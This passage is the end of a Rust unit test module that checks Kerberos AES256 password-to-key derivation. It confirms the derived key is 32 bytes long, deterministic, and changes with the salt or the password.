    /// for a fixed synthetic input — no lab data — so a change in the crypto wiring is caught:
    /// the key must be 32 bytes, deterministic, and salt-sensitive.
    #[test]
    fn aes256_string_to_key_stable() {
        let derive = |pw: &[u8], salt: &[u8]| {
            CipherSuite::Aes256CtsHmacSha196
                .cipher()
                .generate_key_from_password(pw, salt)
                .unwrap()
        };
        let k = derive(b"password", b"CORP.LOCALalice");
        assert_eq!(k.len(), 32);
        assert_eq!(k, derive(b"password", b"CORP.LOCALalice")); // deterministic
        assert_ne!(k, derive(b"password", b"CORP.LOCALbob")); // salt-sensitive
        assert_ne!(k, derive(b"different", b"CORP.LOCALalice")); // password-sensitive
    }
}
